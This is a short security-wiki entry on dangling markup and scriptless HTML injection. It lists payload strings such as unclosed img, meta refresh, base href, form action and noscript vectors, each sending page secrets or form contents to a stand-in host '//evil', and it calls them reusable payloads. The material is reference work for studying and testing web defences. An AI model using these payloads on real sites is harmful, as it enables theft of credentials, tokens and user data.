---
title: "Dangling Markup / Scriptless HTML Injection"
type: technique
tags: [dangling-markup, html-injection, csp-bypass, exfiltration, xss, web]
phase: exploitation
date_created: 2026-07-14
date_updated: 2026-07-14
sources: [hacktricks-web]
---

# Dangling Markup / Scriptless HTML Injection

When you can inject HTML but not script (XSS blocked by CSP/sanitizer, or a secret sits in cleartext
in the HTML), unclosed markup exfiltrates page content and can also serve as a CSP-exfil channel.
The core trick: an unclosed attribute/tag swallows everything up to the next matching quote and
sends it out-of-band. Complements [[xss]] (which only references dangling markup).

## Vectors
- Secret capture: inject `<img src='//evil/?` and the browser sends everything up to the next quote;
  if `<img>` is CSP-blocked use `<meta http-equiv="refresh" content='0;url=//evil/?` or
  `<table background='//evil?`. Chrome blocks HTTP URLs containing `<`/newline, so fall back to
  `ftp://`. CSS `@import //evil?` swallows up to the next `;`.
- Form stealing: inject `<base href="//evil/">` to redirect relative form actions, or inject a new
  `<form action="//evil/">` header (or a `<button formaction>`) to overwrite the next form target,
  then optionally inject `<input type=hidden name=review_body value="` to fold the following HTML
  into a field value.
- Form parameter injection: prepend hidden inputs so an unexpected privileged action is submitted.
- noscript exfil: when JS is disabled, `<noscript><form action=//evil><textarea name=contents>`
  captures the rest of the page.

Payload strings inline above; these double as reusable payloads. Related: [[xss]], [[csp-bypass]].

## Sources
- HackTricks (pentesting-web)
